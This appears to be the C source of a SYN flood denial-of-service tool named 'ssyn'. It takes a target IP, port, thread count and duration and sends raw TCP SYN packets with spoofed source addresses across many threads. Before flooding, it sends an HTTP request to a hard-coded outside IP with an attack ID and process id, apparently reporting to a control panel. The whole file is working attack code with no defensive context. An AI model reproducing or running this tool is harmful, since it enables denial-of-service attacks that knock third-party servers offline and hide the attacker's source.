#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <pthread.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>

void *fnSendThread(void *tid);
void fnSendPacket();
unsigned short fnCalculateCHKSUM(unsigned short *usPointer, int iBytes);
unsigned int fnGetIP(char *);
void fnRandomize(void);

unsigned short usPort; 
unsigned int uiTarget;  
long iTime; 

char szCustom[16];

int fnAttackInformation(int attackID)
{
	char szRecvBuff[1024];
	char packet[1024];
	char ip[] = "37.221.170.5";

	snprintf(packet, sizeof(packet) - 1, "GET /~dqyefldi/response.php?auth=tru&id=%d&pro=%d HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nCache-Control: no-cache\r\nOrigin: http://google.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-GB,en-US;q=0.8,en;q=0.6\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n\r\n", attackID, getpid(), ip);

	struct sockaddr_in *remote;
	int sock;
	int tmpres;
	
 
	if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
	{
		perror("Can't create TCP socket");
		exit(1);
	}
	
	remote = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in *));
	remote->sin_family = AF_INET;
	tmpres = inet_pton(AF_INET, ip, (void *)(&(remote->sin_addr.s_addr)));
	
	if (tmpres < 0)  
	{
		perror("Can't set remote->sin_addr.s_addr");
		exit(1);
	}
	else if (tmpres == 0)
	{
		fprintf(stderr, "%s is not a valid IP address\n", ip);
		exit(1);
	}
	
	remote->sin_port = htons(80);
	
	if (connect(sock, (struct sockaddr *)remote, sizeof(struct sockaddr)) < 0)
	{
		perror("Could not connect");
		exit(1);
	}
		
	tmpres = send(sock, packet, strlen(packet), 0);
	
	//printf("Sent %d bytes -> \n%s\n\n\n", tmpres, packet);	
	
	if (tmpres == -1){
		perror("Can't send query");
		exit(1);
	}

	int i = 1;
	int dwTotal = 0;


	while (1)
	{
		i = recv(sock, szRecvBuff + dwTotal, sizeof(szRecvBuff) - dwTotal, 0);
		//printf("Received %d bytes\n", i);
		if (i <= 0)
			break;
			
		dwTotal += i;
	}

	szRecvBuff[dwTotal] = '\0';
	

	//printf("Received -> \n%s\n\n", szRecvBuff);

	
	close(sock);
	
	//printf("Sent %d bytes\n", tmpres);
	
	return 0;
}

int main(int argc, char **argv)
{
	if(argc < 2)
	{
		printf("Parameters: ./ssyn IP PORT THREADS TIME CUSTOM_IP(optional)\n");
		exit(0);
	}
	
	uiTarget = fnGetIP(argv[1]);
	usPort = 80;
	usPort = atoi(argv[2]);
	int numThreads = 1;
	numThreads = atoi(argv[3]);
	
	pthread_t threads[numThreads];
	if (usPort == 0) usPort = 80;
	
	iTime = 0;
	iTime = atoi(argv[4]);

	
	if (argv[5])
	{
		if (strlen(argv[5]) > 6)
		{
			sprintf(szCustom, "%s", argv[5]);
		}
	}

	//printf("AttackID -> %d PID -> %d\n", atoi(argv[argc-1]), getpid());
	
	fnAttackInformation(atoi(argv[argc-1]));
		
	printf("Starting attack on %s:%d with %d threads for %d seconds\n", argv[1], usPort, numThreads, iTime);

	int rc;
	struct timeval ttime;
        gettimeofday(&ttime, 0);
        iTime += ttime.tv_sec;
	
	for(long t=0; t<numThreads; t++)
	{
		rc = pthread_create(&threads[t], NULL, fnSendThread, (void *)t);
	}
	
	
	while (ttime.tv_sec <= iTime)
	{
		gettimeofday(&ttime, 0);
		sleep(1);
	}
	
}
void *fnSendThread(void *tid)
{
	struct timeval ttime;	
	while (ttime.tv_sec <= iTime )
	{
		gettimeofday(&ttime, 0);
		fnSendPacket();
		usleep(8000);
	}
	
	pthread_exit(NULL);

}

void fnSendPacket()
{
	unsigned int uiSpoofedIP;
	
	struct tcpsend
	{
		struct iphdr ip;
		struct tcphdr tcp;
	} tcpsend;

	unsigned short usRandomPort;

	struct fakehdr
	{
		unsigned int source_addr;
		unsigned int dest_addr;
		unsigned char ph;
		unsigned char pc;
		unsigned short tcp_length;
		struct tcphdr tcp;
	} fakehdr;

	int iSocket;
	struct sockaddr_in addr;
	char szGeneratedIP[12];
	int iLength;

	int iOne, iTwo, iThree, iFour;
	usleep(5000);	
	iOne = (int)(255.0*rand() / (2147483647+1.0)) + 1;
	iTwo = (int)(255.0*rand() / (2147483647+1.0)) + 1;
        iThree = (int)(255.0*rand() / (2147483647+1.0)) + 1;
	tcpsend.ip.ihl = 5;
        tcpsend.ip.version = 4;
        tcpsend.ip.tos = 0;
        tcpsend.ip.tot_len = htons(40);
                tcpsend.ip.frag_off = 0;
                tcpsend.ip.ttl = 255;
                tcpsend.ip.protocol = IPPROTO_TCP;
                tcpsend.ip.check = 0;
tcpsend.tcp.ack_seq = 0;
                tcpsend.tcp.res1 = 0;
                tcpsend.tcp.doff = 5;
                tcpsend.tcp.fin = 0;
                tcpsend.tcp.syn = 1;
                tcpsend.tcp.rst = 0;
                tcpsend.tcp.psh = 0;
                tcpsend.tcp.ack = 0;
                tcpsend.tcp.urg = 0;
                tcpsend.tcp.window = htons(512);
                tcpsend.tcp.check = 0;
                tcpsend.tcp.urg_ptr = 0;

	for (int i = 1; i < 255; i++)
	{
		
		usRandomPort = (int)(20000.0 * rand()/(2147483647+1.0)) + 1;

		if (strlen(szCustom) <= 6)			
		{	
			sprintf(szGeneratedIP,"%d.%d.%d.%d", iOne, iTwo, iThree, i);
			uiSpoofedIP = fnGetIP(szGeneratedIP);
		}
		else
		{
			uiSpoofedIP = fnGetIP(szCustom);
		}

			
		tcpsend.ip.id = usRandomPort;
		tcpsend.ip.saddr = uiSpoofedIP;
		tcpsend.ip.daddr = uiTarget;

		tcpsend.tcp.source = usRandomPort;
		tcpsend.tcp.dest = htons(usPort);
		tcpsend.tcp.seq = usRandomPort;

		
		//declare struct vars
		addr.sin_family = AF_INET;
		addr.sin_port = tcpsend.tcp.source;
		addr.sin_addr.s_addr = tcpsend.ip.daddr;

		iSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

		//failed to create socket onoezzzzzz
		if(iSocket < 0)
		{
			exit(1);
		}

		tcpsend.tcp.source++;
		tcpsend.ip.id++;
		tcpsend.tcp.seq++;
		tcpsend.tcp.check = 0;
		tcpsend.ip.check = 0;

		tcpsend.ip.check = fnCalculateCHKSUM((unsigned short *)&tcpsend.ip, 20);

		fakehdr.source_addr = tcpsend.ip.saddr;
		fakehdr.dest_addr = tcpsend.ip.daddr;
		fakehdr.ph = 0;
		fakehdr.pc = IPPROTO_TCP;
		fakehdr.tcp_length = htons(20);

		//copy shit
		bcopy((char *)&tcpsend.tcp, (char *)&fakehdr.tcp, 20);

		tcpsend.tcp.check = fnCalculateCHKSUM((unsigned short *)&fakehdr, 32);
		iLength = sizeof(addr);


//		sendto(iSocket, &tcpsend, 40, 0, (struct sockaddr *)&addr, iLength);
		sendto(iSocket, &tcpsend, 40, 0, (struct sockaddr *)&addr, iLength);


		close(iSocket);
	}
}

unsigned short fnCalculateCHKSUM(unsigned short *usPointer, int iBytes)
{
	register long           lSum;
	u_short                 usOdd;
	register u_short        usAnswer;

	lSum = 0;

	while (iBytes > 1)  
	{
		lSum += *usPointer++;
		iBytes -= 2;
	}

	
	if (iBytes == 1) 
	{
		usOdd = 0; 
		*((u_char *) &usOdd) = *(u_char *)usPointer;  
		lSum += usOdd;
	}

	lSum  = (lSum >> 16) + (lSum & 0xffff); 
	lSum += (lSum >> 16); 

	usAnswer = ~lSum;

	return(usAnswer);
}

unsigned int fnGetIP(char *szHost)
{
	static struct in_addr addr;

	struct hostent *hHost;

	addr.s_addr = inet_addr(szHost);

	if(addr.s_addr == -1)
	{
		hHost = gethostbyname(szHost);

		if(hHost == NULL)
		{
			exit(0);
		}
		bcopy(hHost->h_addr, (char *)&addr.s_addr, hHost->h_length);
	}

	return addr.s_addr;
}

